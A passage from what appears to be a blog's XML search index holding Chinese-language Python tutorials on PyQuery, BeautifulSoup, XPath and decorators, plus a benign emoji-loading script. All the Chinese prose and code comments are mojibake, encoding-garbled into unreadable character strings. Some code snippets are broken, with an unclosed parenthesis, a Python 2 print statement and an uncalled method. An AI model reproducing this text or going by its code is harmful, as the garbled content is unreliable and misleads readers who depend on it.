doc('div.content li').items() for i in lis: print(i.text()) # 5. å¦‚æœç±»åä¸å”¯ä¸€ï¼Œè¿˜å¯ä»¥åŠ ä¸Šå…¶ä»–çš„ç±»åä¸€èµ·å®šä½ print(doc('div.cont.a.b.c.d')) # æ ‡ç­¾é‡Œçš„ç©ºæ ¼è¡¨ç¤º`å¹¶åˆ—`ï¼Œè¡¨ç¤ºè¿™ä¸ªdivæ ‡ç­¾æœ‰cont,a,b,c,dè¿™äº”ä¸ªç±»åï¼Œä½†åœ¨cssè¯­æ³•é‡Œç©ºæ ¼è¡¨ç¤º`åµŒå¥—`ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ·»åŠ å…¶ä»–ç±»åçš„æ—¶å€™`ä¸èƒ½è¾“å…¥ç©ºæ ¼`ï¼Œè€Œæ˜¯ç›´æ¥ç”¨`å°æ•°ç‚¹`æ¥æ·»åŠ å…¶ä»–ç±»å # 6. è·å–å±æ€§ attr("å±æ€§å") lis = doc('div.content li').items() for i in lis: print(i.text(),i('a').attr('href')) # 7. å…¶ä»–çš„ä¸€äº›é€‰æ‹©å™¨ lis = doc('div.content ul li') #çˆ¶èŠ‚ç‚¹,åŒ…å«çˆ¶èŠ‚ç‚¹çš„æ‰€æœ‰å­å­™èŠ‚ç‚¹çš„å†…å®¹ #ç›¸å½“äº #print(doc('div.content ul')) print(lis.parent()) #ç¥–å…ˆèŠ‚ç‚¹,å°±ç›¸å½“äºæ‰€æœ‰æºä»£ç äº† print(lis.parents()) #å…„å¼ŸèŠ‚ç‚¹,å³åŒçº§èŠ‚ç‚¹ï¼Œä¸åŒ…å«è‡ªå·± print(lis.siblings) å…¶ä»–æŠ€å·§1.ä¼ªç±»é€‰æ‹©å™¨ #ç¬¬äºŒä¸ªæ ‡ç­¾ lis = doc('div.content li:nth-child(2)').items() for i in lis: print(i.text(),i('a').attr('href')) # ç¬¬ä¸€ä¸ªaæ ‡ç­¾çš„è¯­æ³•æ˜¯ a:first-child,æœ€åä¸€ä¸ªæ˜¯a:last-child,å…¶å®ƒä½ç½®çš„è¯­æ³•å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç¬¬å‡ ä¸ªæ‹¬å·é‡Œå°±æ˜¯å‡ ï¼ˆå½“ç„¶ç¬¬ä¸€ä¸ªä½ ä¹Ÿå¯ä»¥å†™æˆ li:nth-child(1)) ç±»ä¼¼çš„ #div.content ä¸‹é¢ç¬¬äºŒä¸ªï¼ˆå«ï¼‰ä¹‹åçš„liæ ‡ç­¾ lis = doc('div.content li:gt(1)').items() for i in lis: print(i.text(),i('a').attr('href')) # gtå°±æ˜¯greater than,å¤§äºçš„æ„æ€ï¼Œlt (less than)æ˜¯å°äº ç­›é€‰æ–‡æœ¬ lis = doc('div.content ul').items() for i in lis: #æ–‡æœ¬åŒ…å«é—®å·çš„liæ ‡ç­¾ print(i("li:contains('ï¼Ÿ')").text()) 2.ä¿®æ”¹æ ‡ç­¾å±æ€§ #ç”¨removeæŠŠç‰¹å®šæ ‡ç­¾ç§»é™¤ï¼Œç„¶åå†è¿›è¡Œéå† lis = doc('div.content ul').remove('.content-article').items() for i in lis: print(i.text()) # è¿˜æœ‰å¦‚ä¿®æ”¹å±æ€§ï¼Œå¢åŠ cssä¹‹ç±»çš„ä¸€äº›ä½¿ç”¨ç‡è¾ƒä½çš„ï¼Œç”¨åˆ°çš„æ—¶å€™å»å®˜æ–¹æ–‡æ¡£æŸ¥ ###### ç›´æ¥åœ¨Chromeé‡Œè°ƒè¯• Chromeæµè§ˆå™¨è‡ªå¸¦cssçš„æŸ¥è¯¢æ–¹æ³•ï¼ŒæŒ‰f12æˆ–è€…å³é”®æ£€æŸ¥ï¼Œæ‰“å¼€Elementsé¢æ¿ï¼ŒæŒ‰ctrl+fï¼Œ è¿™é‡Œæ”¯æŒxpathï¼Œcssè¯­æ³•ï¼Œä»¥åŠæ™®é€šçš„å­—ç¬¦æŸ¥æ‰¾ è¦æ³¨æ„çš„æ˜¯å³è¾¹çš„æ•°å­—ï¼Œæ˜¾ç¤ºçš„æ˜¯æ»¡è¶³æ¡ä»¶çš„æ ‡ç­¾æ•°é‡ï¼Œå¯ä»¥æŒ‰å‘ä¸‹çš„ç®­å¤´è¿‡ä¸€éï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è‡ªå·±æƒ³è¦çš„ä¿¡æ¯ã€‚ äº¬ä¸œçš„å•†å“æ ç›® import requests from pyquery import PyQuery as pq url = 'https://www.jd.com/' r = requests.get(url) # å®ä¾‹åŒ– doc = pq(r.text) flag = 1 # for i in doc("li.cate_menu_item:nth-child(3) a").items(): for i in doc("li.cate_menu_item:gt(1) a").items(): # print(i.text()) print(i.attr('href')) print(i.text()) flag = flag + 1 print("------------") print(flag) å‚è€ƒæ–‡ç« ï¼šhttps://www.jianshu.com/p/7eb136bbe317 æ›´å¤šç”¨æ³•ï¼šhttps://pythonhosted.org/pyquery/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>PyQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-Beautifulsoup]]></title>
    <url>%2Fposts%2Fa2109bc%2F</url>
    <content type="text"><![CDATA[Beautifulsoupä¹Ÿæ˜¯ç”¨æ¥è§£æç½‘é¡µæ•°æ®çš„ BeautifulSoupå¯¹è±¡å››ç§ç±»å‹: tag NavigableString BeautifulSoap Comment åˆå§‹åŒ–å®‰è£…pip3 install beautifulsoup4 å¯¼å…¥from bs4 import BeautifulSoup ä½¿ç”¨from bs4 import BeautifulSoup soup = BeautifulSoup(html_doc, 'html.parser') print(soup.title) æŸ¥æ‰¾åŸºæœ¬soup = BeautifulSoup(open("index.html")) #æ–‡ä»¶å¥æŸ„ soup = BeautifulSoup("&lt;html>data&lt;/html>") #å­—ç¬¦ä¸² find å’Œ find_allæœç´¢å½“å‰ tag çš„æ‰€æœ‰ tag å­èŠ‚ç‚¹ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦ç¬¦åˆè¿‡æ»¤å™¨çš„æ¡ä»¶ è¯­æ³•ï¼š find(name=None, attrs={}, recursive=True, text=None, **kwargs) find_all(name=None, attrs={}, recursive=True, text=None, limit=None, **kwargs) é€šè¿‡ attrs å‚æ•°ä¼ é€’ï¼š data_soup = BeautifulSoup('&lt;div data-foo="value">foo!&lt;/div>') print(data_soup.find_all(attrs={"data-foo": "value"})) æŒ‰ class_ æŸ¥æ‰¾: css_soup = BeautifulSoup('&lt;p class="body bold strikeout">&lt;/p>') print(css_soup.find_all("p", class_="strikeout")) print(css_soup.find_all("p", class_="body")) å…¶ä»–æœç´¢æ–¹æ³•ï¼š find_parents() # è¿”å›æ‰€æœ‰ç¥–å…ˆèŠ‚ç‚¹ find_parent() # è¿”å›ç›´æ¥çˆ¶èŠ‚ç‚¹ find_next_siblings() # è¿”å›åé¢æ‰€æœ‰çš„å…„å¼ŸèŠ‚ç‚¹ find_next_sibling() # è¿”å›åé¢çš„ç¬¬ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹ find_previous_siblings() # è¿”å›å‰é¢æ‰€æœ‰çš„å…„å¼ŸèŠ‚ç‚¹ find_previous_sibling() # è¿”å›å‰é¢ç¬¬ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹ find_all_next() # è¿”å›èŠ‚ç‚¹åæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ find_next() # è¿”å›èŠ‚ç‚¹åç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ find_all_previous() # è¿”å›èŠ‚ç‚¹å‰æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ find_previous() # è¿”å›èŠ‚ç‚¹å‰æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ ä»æ–‡æ¡£ä¸­æ‰¾åˆ°æ‰€æœ‰aæ ‡ç­¾çš„é“¾æ¥: for link in soup.find_all('a'): print(link.get('href')) ä»æ–‡æ¡£ä¸­è·å–æ‰€æœ‰æ–‡å­—å†…å®¹: print(soup.get_text()) å¯¹è±¡TagTagå¯¹è±¡ä¸XMLæˆ–HTMLåŸç”Ÿæ–‡æ¡£ä¸­çš„tagç›¸åŒ tagä¸­æœ€é‡è¦çš„å±æ€§: nameå’Œattributes name tag.name # å¤èµ‹å€¼ tag.name = "xxx" attributes ä¸€ä¸ªtagå¯èƒ½æœ‰å¾ˆå¤šä¸ªå±æ€§ï¼Œä¸€ä¸ªå±æ€§å¯èƒ½æœ‰å¾ˆå¤šä¸ªå€¼ã€‚ `python è·å–tagçš„æŒ‡å®šå±æ€§çš„å±æ€§å€¼tag[â€˜classâ€™] è·å–tagçš„å…¨éƒ¨å±æ€§åŠå±æ€§å€¼:tag.attrs tagå±æ€§åŠå±æ€§å€¼æ·»åŠ tag[â€˜classâ€™] = â€˜rowâ€™ å±æ€§å€¼çš„åˆ é™¤del tag[â€˜classâ€™] æŸ¥çœ‹å±æ€§å€¼print(tag.get(â€˜classâ€™)) å¤šå€¼å±æ€§tagï¼š è¿”å›ç±»å‹ä¸€èˆ¬æ˜¯list,ä½†å½“æŸä¸ªå±æ€§åœ¨ä»»ä½•ç‰ˆæœ¬çš„HTMLå®šä¹‰ä¸­éƒ½æ²¡æœ‰è¢«å®šä¹‰ä¸ºå¤šå€¼å±æ€§æ—¶ï¼Œä¼šå°†è¿™ä¸ªå±æ€§ä½œä¸ºå­—ç¬¦ä¸²è¿”å› ```python css_soup = BeautifulSoup('&lt;p class="body row"&gt;&lt;/p&gt;') css_soup.p['class'] # ["body", "row"] css_soup = BeautifulSoup('&lt;p class="body"&gt;&lt;/p&gt;') css_soup.p['class'] # ["body"] id_soup = BeautifulSoup('&lt;p id="my id"&gt;&lt;/p&gt;') id_soup.p['id'] # 'my id' å¦‚æœè½¬æ¢çš„æ–‡æ¡£æ˜¯XMLæ ¼å¼,é‚£ä¹ˆtagä¸­ä¸åŒ…å«å¤šå€¼å±æ€§ è·å–tagæŸä¸ªå­èŠ‚ç‚¹: soup.tagåï¼Œ soup.a è·å–tagå…¨éƒ¨å­èŠ‚ç‚¹: .contents å’Œ .children è·å–tagå…¨éƒ¨å­èŠ‚ç‚¹åŠå­å­™èŠ‚ç‚¹ï¼š.descendants for child in head_tag.descendants: print(child) èŠ‚ç‚¹å†…çš„å­—ç¬¦ä¸²: # .string head_tag.string # .strings å¦‚æœtagä¸­åŒ…å«å¤šä¸ªå­—ç¬¦ä¸²`.strings` æ¥å¾ªç¯è·å– head_tag.strings for string in soup.strings: print(repr(string)) # .stripped_strings å»é™¤ç©ºè¡Œç©ºç™½ for string in soup.stripped_strings: print(repr(string)) çˆ¶äº²èŠ‚ç‚¹ï¼š.parent æ‰€æœ‰çˆ¶è¾ˆèŠ‚ç‚¹ï¼š.parents å…„å¼ŸèŠ‚ç‚¹: .prettify(), å…¶ä¸­next_siblingå’Œprevious_siblingæ˜¯å‰åå…„å¼Ÿ å›é€€å’Œå‰è¿›ï¼š é€šè¿‡ .next_elements å’Œ .previous_elements çš„è¿­ä»£å™¨å°±å¯ä»¥å‘å‰æˆ–å‘åè®¿é—®æ–‡æ¡£çš„è§£æå†…å®¹,å°±å¥½åƒæ–‡æ¡£æ­£åœ¨è¢«è§£æä¸€æ · find_all# è¿‡æ»¤str soup.find_all('b') # è¿‡æ»¤æ­£åˆ™ for tag in soup.find_all(re.compile("^b")): print(tag.name) # è¿‡æ»¤å¤šä¸ª soup.find_all(["a", "b"]) # True:å¯ä»¥åŒ¹é…ä»»ä½•å€¼,ä¸‹é¢ä»£ç æŸ¥æ‰¾åˆ°æ‰€æœ‰çš„`ä¸€çº§`tag for tag in soup.find_all(True): print(tag.name) # limit æ˜¾ç¤ºè¿”å›æ•°é‡ soup.find_all("a", limit=2) # åªæœç´¢tagçš„ç›´æ¥å­èŠ‚ç‚¹, soup.html.find_all("title", recursive=False) def test(tag): #åŒ…å« class å±æ€§å´ä¸åŒ…å« id å±æ€§ return tag.has_attr('class') and not tag.has_attr('id') # è°ƒç”¨ soup.find_all(test) #ä¸‹é¢ä¸¤è¡Œä»£ç æ˜¯ç­‰ä»·çš„ soup.find_all('div', limit=1) soup.find('div') åŒºåˆ«:find_all() æ–¹æ³•çš„è¿”å›ç»“æœæ˜¯å€¼åŒ…å«ä¸€ä¸ªå…ƒç´ çš„åˆ—è¡¨,è€Œ find() æ–¹æ³•ç›´æ¥è¿”å›ç»“æœ.find_all() æ–¹æ³•æ²¡æœ‰æ‰¾åˆ°ç›®æ ‡æ˜¯è¿”å›ç©ºåˆ—è¡¨, find() æ–¹æ³•æ‰¾ä¸åˆ°ç›®æ ‡æ—¶,è¿”å› None NavigableStringå¯éå†å­—ç¬¦ä¸² é€šè¿‡ unicode() æ–¹æ³•å¯ä»¥ç›´æ¥å°† NavigableString å¯¹è±¡è½¬æ¢æˆUnicodeå­—ç¬¦ä¸²: unicode_string = unicode(tag.string) BeautifulSoupè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªæ–‡æ¡£çš„å…¨éƒ¨å†…å®¹,å¯ä»¥æŠŠå®ƒå½“ä½œ Tag å¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ Tagï¼Œæˆ‘ä»¬å¯ä»¥åˆ†åˆ«è·å–å®ƒçš„ç±»å‹ï¼Œåç§°ï¼Œä»¥åŠå±æ€§ã€‚ Commenthtml_doc='&lt;a href="http://z.com" class="row" id="box">&lt;!-- hhh -->&lt;/a>' soup = BeautifulSoup(html_doc, 'html.parser') print(soup.a.string) # hhh print(type(soup.a.string)) # &lt;class 'bs4.element.Comment'> """ a æ ‡ç­¾é‡Œçš„å†…å®¹å®é™…ä¸Šæ˜¯æ³¨é‡Šï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬åˆ©ç”¨ .string æ¥è¾“å‡ºå®ƒçš„å†…å®¹ï¼Œæˆ‘ä»¬å‘ç°å®ƒå·²ç»æŠŠæ³¨é‡Šç¬¦å·å»æ‰äº†ï¼Œæ‰€ä»¥è¿™å¯èƒ½ä¼šç»™æˆ‘ä»¬å¸¦æ¥ä¸å¿…è¦çš„éº»çƒ¦ã€‚ """ # åœ¨ä½¿ç”¨å‰æœ€å¥½åšä¸€ä¸‹åˆ¤æ–­ if type(soup.a.string)==bs4.element.Comment: print soup.a.string document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Beautifulsoup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-XPath]]></title>
    <url>%2Fposts%2F12481%2F</url>
    <content type="text"><![CDATA[XPathXPathï¼Œå…¨ç§° XML Path Languageï¼Œå³ XML è·¯å¾„è¯­è¨€ï¼Œå®ƒæ˜¯ä¸€é—¨åœ¨ XML æ–‡æ¡£ä¸­æŸ¥æ‰¾ä¿¡æ¯çš„è¯­è¨€ã€‚æœ€åˆæ˜¯ç”¨æ¥æœå¯» XML æ–‡æ¡£çš„ï¼Œä½†åŒæ ·é€‚ç”¨äº HTML æ–‡æ¡£çš„æœç´¢ã€‚æ‰€ä»¥åœ¨åšçˆ¬è™«æ—¶å®Œå…¨å¯ä»¥ä½¿ç”¨ XPath åšç›¸åº”çš„ä¿¡æ¯æŠ½å–ã€‚ pythonåº“lxmlçš„å®‰è£…pip3 install lxml XPathå¸¸ç”¨è§„åˆ™ è¡¨è¾¾å¼ æè¿° nodename é€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹ / ä»å½“å‰èŠ‚ç‚¹é€‰å–ç›´æ¥å­èŠ‚ç‚¹ // ä»å½“å‰èŠ‚ç‚¹é€‰å–å­å­™èŠ‚ç‚¹ . é€‰å–å½“å‰èŠ‚ç‚¹ .. é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ @ é€‰å–å±æ€§ * é€šé…ç¬¦ï¼Œé€‰æ‹©æ‰€æœ‰å…ƒç´ èŠ‚ç‚¹ä¸å…ƒç´ å @* é€‰å–æ‰€æœ‰å±æ€§ [@attrib] é€‰å–å…·æœ‰ç»™å®šå±æ€§çš„æ‰€æœ‰å…ƒç´  [@attrib=â€™valueâ€™] é€‰å–ç»™å®šå±æ€§å…·æœ‰ç»™å®šå€¼çš„æ‰€æœ‰å…ƒç´  [tag] é€‰å–æ‰€æœ‰å…·æœ‰æŒ‡å®šå…ƒç´ çš„ç›´æ¥å­èŠ‚ç‚¹ [tag=â€™textâ€™] é€‰å–æ‰€æœ‰å…·æœ‰æŒ‡å®šå…ƒç´ å¹¶ä¸”æ–‡æœ¬å†…å®¹æ˜¯textèŠ‚ç‚¹ XPathä¸­çš„è¿ç®—ç¬¦ è¿ç®—ç¬¦ æè¿° å®ä¾‹ è¿”å›å€¼ or æˆ– age=19 or age=20 å¦‚æœageç­‰äº19æˆ–è€…ç­‰äº20åˆ™è¿”å›trueåæ­£è¿”å›false and ä¸ age&gt;19 and age&lt;21 å¦‚æœageç­‰äº20åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false mod å–ä½™ 5 mod 2 1 \ å–ä¸¤ä¸ªèŠ‚ç‚¹çš„é›†åˆ //book \ //cd è¿”å›æ‰€æœ‰æ‹¥æœ‰bookå’Œcdå…ƒç´ çš„èŠ‚ç‚¹é›†åˆ + åŠ  6+4 10 - å‡ 6-4 2 * ä¹˜ 6*4 24 div é™¤æ³• 8 div 4 2 = ç­‰äº age=19 true != ä¸ç­‰äº age!=19 true &lt; å°äº age&lt;19 true &lt;= å°äºæˆ–ç­‰äº age&lt;=19 true &gt; å¤§äº age&gt;19 true &gt;= å¤§äºæˆ–ç­‰äº age&gt;=19 true è§£ææ–¹å¼from lxml import etree text=''' &lt;div> &lt;ul> &lt;li class="item-0">&lt;a href="link1.html">ç¬¬ä¸€ä¸ª&lt;/a>&lt;/li> &lt;li class="item-1">&lt;a href="link2.html">second item&lt;/a>&lt;/li> &lt;li class="item-0">&lt;a href="link5.html">aå±æ€§&lt;/a> &lt;/ul> &lt;/div> ''' # 1.è¯»å–æ–‡æœ¬è§£æèŠ‚ç‚¹ html=etree.HTML(text) #åˆå§‹åŒ–ç”Ÿæˆä¸€ä¸ªXPathè§£æå¯¹è±¡ result=etree.tostring(html,encoding='utf-8') #è§£æå¯¹è±¡è¾“å‡ºä»£ç  # 2.è¯»å–HTMLæ–‡ä»¶è¿›è¡Œè§£æ html=etree.parse('test.html',etree.HTMLParser()) #æŒ‡å®šè§£æå™¨HTMLParserä¼šæ ¹æ®æ–‡ä»¶ä¿®å¤HTMLæ–‡ä»¶ä¸­ç¼ºå¤±çš„å¦‚å£°æ˜ä¿¡æ¯ result=etree.tostring(html) #è§£ææˆå­—èŠ‚ #result=etree.tostringlist(html) #è§£ææˆåˆ—è¡¨ è·å–å…ƒç´ èŠ‚ç‚¹# 1.è·å–æ‰€æœ‰èŠ‚ç‚¹ // from lxml import etree html=etree.parse('test.html',etree.HTMLParser()) result=html.xpath('//*') #//ä»£è¡¨è·å–å­å­™èŠ‚ç‚¹ï¼Œ*ä»£è¡¨è·å–æ‰€æœ‰ # å¦‚è¦è·å–lièŠ‚ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨//åé¢åŠ ä¸ŠèŠ‚ç‚¹åç§°ï¼Œç„¶åè°ƒç”¨xpath()æ–¹æ³• html.xpath('//li') #è·å–æ‰€æœ‰å­å­™èŠ‚ç‚¹çš„lièŠ‚ç‚¹ # 2.è·å–å­èŠ‚ç‚¹ / result=html.xpath('//li/a') #é€šè¿‡è¿½åŠ /aé€‰æ‹©æ‰€æœ‰lièŠ‚ç‚¹çš„æ‰€æœ‰ç›´æ¥aèŠ‚ç‚¹ï¼Œå› ä¸º//liç”¨äºé€‰ä¸­æ‰€æœ‰lièŠ‚ç‚¹ï¼Œ/aç”¨äºé€‰ä¸­lièŠ‚ç‚¹çš„`æ‰€æœ‰ç›´æ¥å­èŠ‚ç‚¹a` # 3.è·å–çˆ¶èŠ‚ç‚¹ .. parent:: # ä½¿ç”¨`..`æ¥å®ç°ä¹Ÿå¯ä»¥ä½¿ç”¨`parent::`æ¥è·å–çˆ¶èŠ‚ç‚¹ html=etree.HTML(text, etree.HTMLParser()) result=html.xpath('//a[@href="link2.html"]/../@class') result1=html.xpath('//a[@href="link2.html"]/parent::*/@class' # 4.æ ¹æ®å±æ€§åŒ¹é…èŠ‚ç‚¹ //div[@class='box'] html=etree.HTML(text, etree.HTMLParser()) result=html.xpath('//li[@class="item-1"]') print(result) # 5.è·å–èŠ‚ç‚¹ä¸­çš„æ–‡æœ¬ text() html=etree.HTML(text,etree.HTMLParser()) result=html.xpath('//li[@class="item-1"]/a/text()') #è·å–aèŠ‚ç‚¹ä¸‹çš„å†…å®¹ result1=html.xpath('//li[@class="item-1"]//text()') #è·å–liä¸‹æ‰€æœ‰å­å­™èŠ‚ç‚¹çš„å†…å®¹ # 6. è·å–å±æ€§ @href, @class, @src result=html.xpath('//li/a/@href') #è·å–açš„hrefå±æ€§ result=html.xpath('//li//@href') #è·å–æ‰€æœ‰liå­å­™èŠ‚ç‚¹çš„hrefå±æ€§ # 7. å±æ€§å¤šå€¼åŒ¹é…èŠ‚ç‚¹(æŸä¸ªå±æ€§çš„å€¼æœ‰å¤šä¸ªæ—¶ï¼Œä¸€ä¸ªèŠ‚ç‚¹æœ‰å¤šä¸ªå±æ€§å€¼) contains() text1=''' &lt;div> &lt;ul> &lt;li class="aaa item-0">&lt;a href="link1.html">ç¬¬ä¸€ä¸ª&lt;/a>&lt;/li> &lt;li class="bbb item-1">&lt;a href="link2.html">second item&lt;/a>&lt;/li> &lt;/ul> &lt;/div> ''' html=etree.HTML(text1,etree.HTMLParser()) result1=html.xpath('//li[contains(@class,"aaa")]/a/text()') # 8.å¤šå±æ€§åŒ¹é…ï¼ˆæ ¹æ®å¤šä¸ªå±æ€§ç¡®å®šä¸€ä¸ªèŠ‚ç‚¹ï¼Œ å¤šä¸ªèŠ‚ç‚¹æœ‰ç›¸åŒçš„å±æ€§å€¼ï¼‰ and text1=''' &lt;div> &lt;ul> &lt;li class="aaa" name="item">&lt;a href="link1.html">ç¬¬ä¸€ä¸ª&lt;/a>&lt;/li> &lt;li class="aaa" name="fore">&lt;a href="link2.html">second item&lt;/a>&lt;/li> &lt;/ul> &lt;/div> ''' html=etree.HTML(text1,etree.HTMLParser()) result=html.xpath('//li[@class="aaa" and @name="fore"]/a/text()') result1=html.xpath('//li[contains(@class,"aaa") and @name="fore"]/a/text()') # 9. æŒ‰åºé€‰æ‹© # å¯èƒ½åŒæ—¶åŒ¹é…å¤šä¸ªèŠ‚ç‚¹ï¼Œä½†æˆ‘ä»¬åªæƒ³è¦å…¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹ï¼Œå¦‚ç¬¬äºŒä¸ªèŠ‚ç‚¹æˆ–è€…æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨ä¸­æ‹¬å·å¼•å…¥ç´¢å¼•çš„æ–¹æ³•è·å–ç‰¹å®šæ¬¡åºçš„èŠ‚ç‚¹ï¼š [1], [last()], position() result=html.xpath('//li[contains(@class,"aaa")]/a/text()') #è·å–æ‰€æœ‰lièŠ‚ç‚¹ä¸‹aèŠ‚ç‚¹çš„å†…å®¹ result1=html.xpath('//li[1][contains(@class,"aaa")]/a/text()') #è·å–ç¬¬ä¸€ä¸ª result2=html.xpath('//li[last()][contains(@class,"aaa")]/a/text()') #è·å–æœ€åä¸€ä¸ª result3=html.xpath('//li[position()>2 and position()&lt;4][contains(@class,"aaa")]/a/text()') #è·å–ç¬¬ä¸‰ä¸ª result4=html.xpath('//li[last()-2][contains(@class,"aaa")]/a/text()') #è·å–å€’æ•°ç¬¬ä¸‰ä¸ª # XPathçš„å‡½æ•°ï¼š http://www.w3school.com.cn/xpath/xpath_functions.asp # 10. èŠ‚ç‚¹è½´é€‰æ‹© # åŒ…æ‹¬è·å–å­å…ƒç´ ã€å…„å¼Ÿå…ƒç´ ã€çˆ¶å…ƒç´ ã€ç¥–å…ˆå…ƒç´ ç­‰ result=html.xpath('//li[1]/ancestor::*') #è·å–æ‰€æœ‰ç¥–å…ˆèŠ‚ç‚¹ result1=html.xpath('//li[1]/ancestor::div') #è·å–divç¥–å…ˆèŠ‚ç‚¹ result2=html.xpath('//li[1]/attribute::*') #è·å–æ‰€æœ‰å±æ€§å€¼ result3=html.xpath('//li[1]/child::*') #è·å–æ‰€æœ‰ç›´æ¥å­èŠ‚ç‚¹ result4=html.xpath('//li[1]/descendant::a') #è·å–æ‰€æœ‰å­å­™èŠ‚ç‚¹çš„aèŠ‚ç‚¹ result5=html.xpath('//li[1]/following::*') #è·å–å½“å‰å­èŠ‚ä¹‹åçš„æ‰€æœ‰èŠ‚ç‚¹ result6=html.xpath('//li[1]/following-sibling::*') #è·å–å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰åŒçº§èŠ‚ç‚¹ # æ›´å¤šè½´çš„ç”¨æ³•å¯å‚è€ƒï¼šhttp://www.w3school.com.cn/xpath/xpath_axes.asp æœ¬æ–‡å‚è€ƒï¼šhttps://www.cnblogs.com/zhangxinqi/p/9210211.html åšä¸»å†™çš„å¾ˆè¯¦ç»†ï¼Œä¹Ÿå¾ˆç¾è§‚ XPathçš„æ›´å¤šç”¨æ³•å‚è€ƒï¼šhttp://www.w3school.com.cn/xpath/index.asp python lxmlåº“çš„æ›´å¤šç”¨æ³•å‚è€ƒï¼šhttp://lxml.de/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>XPath</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonåŸºç¡€-è£…é¥°å™¨]]></title>
    <url>%2Fposts%2F6b278895%2F</url>
    <content type="text"><![CDATA[è£…é¥°å™¨###å‡½æ•°çš„è£…é¥°å™¨,æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªé—­åŒ… ## æ¦‚æ‹¬çš„è®²ï¼Œè£…é¥°å™¨çš„ä½œç”¨å°±æ˜¯ä¸ºå·²ç»å­˜åœ¨çš„å¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ã€‚ def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2 @f1 #è£…é¥°å™¨ (@ç¬¦å·åŠ å‡½æ•°å,è£…é¥°ä¸Šäº†gunå‡½æ•°) #ç›¸å½“äºf1(gun) def gun(m): print('gun runing') return m*m ## @f1 -> f1( gun) -> f2 n=gun(5) # gun(5) -> å°±æ˜¯åœ¨è¿è¡Œ f2(5) print(n) #############ä¾‹å­: import time def run_time(func): def new_fun(*args,**kwargs): t0 = time.time() print('star time: %s'%(time.strftime('%X',time.localtime())) ) back = func(*args,**kwargs) print('end time: %s'%(time.strftime('%X',time.localtime())) ) print('run time: %s'%(time.time() - t0)) return back return new_fun @run_time def test2(n): for i in range(1,n): for j in range(1,i+1): print('%dx%d=%2s'%(j,i,i*j),end = ' ') print () #@run_time -> run_time(test2) -> new_fun n = test2(10) #å°±ç›¸å½“äºè¿è¡Œnew_time(5) ä¾‹å­# å†™ä¸€ä¸ªloginå‡½æ•° ç„¶åå†™ä¸€ä¸ªè£…é¥°å™¨ï¼Œæ¨¡æ‹Ÿç™»å½•è¿‡ç¨‹ï¼šè®©ç¨‹åºå»¶è¿Ÿ3ç§’ åœ¨å»¶è¿Ÿè¿‡ç¨‹ä¸­è¾“å‡ºæ­£åœ¨éªŒè¯ """ def login(): print('ç™»å½•æˆåŠŸ') """ import time def login_required(func): def wrpper(*args,**kwargs): print('æ­£åœ¨éªŒè¯...') time.sleep(5) return func(*args,**kwargs) return wrpper @login_required def login(): print('ç™»å½•æˆåŠŸ') #return 'code:200' login() ç±»ä½œä¸ºè£…é¥°å™¨## ç”¨__call__æ–¹æ³• class Tset_Class(): def __init__(self,func): # ä¼ è¿›æ¥å‡½æ•° print('æ­£åœ¨å®ä¾‹åŒ–') self.func = func def __call__(self, *args, **kwargs): #ç±»è£…é¥°å™¨, ä¸€å®šè¦å†™__call__æ–¹æ³• print('è¿™æ˜¯callæ–¹æ³•') return self.func @Tset_Class def test(): print('è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•å‡½æ•°') n = test() # self.func : test å‡½æ•°ä½“ n() # n() è°ƒç”¨testï¼ˆï¼‰ # 1. @Tset_Class ï¼š Tset_Class( test ) -> ç›¸å½“äºï¼št = Tset_Class( test ) # 2. test() -> ç›¸å½“äºï¼š 